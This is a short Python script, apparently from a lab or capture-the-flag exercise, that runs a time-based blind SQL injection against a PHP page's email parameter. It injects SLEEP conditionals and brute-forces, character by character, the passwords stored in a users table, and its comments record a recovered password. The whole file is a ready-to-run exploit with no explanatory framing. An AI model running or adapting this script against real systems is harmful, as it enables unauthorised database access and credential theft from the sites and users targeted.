import os
import requests
import time

# GET COLUMN NAMES

dbname = "user_db"
chars = "abcdefghijklmnopqrstuvwxyz0123456789-_+!}{)(ABCDEFGHIJKLMNOPQRSTUVWXYZ@."

tableName = ""

for i in range(1, 40):
    for char in chars:


        target = "http://10.102.126.109/regards.php?email='AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='"
        target = target.replace("SLEEP(5)", "IF(LENGTH(DATABASE())='7', SLEEP(1), SLEEP(0))")




        query = "SUBSTRING((SELECT password FROM users LIMIT 0,1),{},1)='{}'".format(i, char) # PASSWORD = b3stc0d3reu
        query = "SUBSTRING((SELECT password FROM users LIMIT 1,1),{},1)='{}'".format(i, char) # PASSWORD = b3stc0d3reu
        query = "SUBSTRING((SELECT password FROM users LIMIT 2,1),{},1)='{}'".format(i, char) # PASSWORD = b3stc0d3reu





        target = target.replace("LENGTH(DATABASE())='7'", query)

        r = requests.get(target)
        #print(r.elapsed.total_seconds(), target)



        taken = r.elapsed.total_seconds()
        
        if taken > 0.2:
            if taken > 1.0:
                print("{} = {}".format(i, char))
                tableName += char
                print(tableName)
                break
        else:
            pass
            #print("ERROR {} {}".format(i, char))

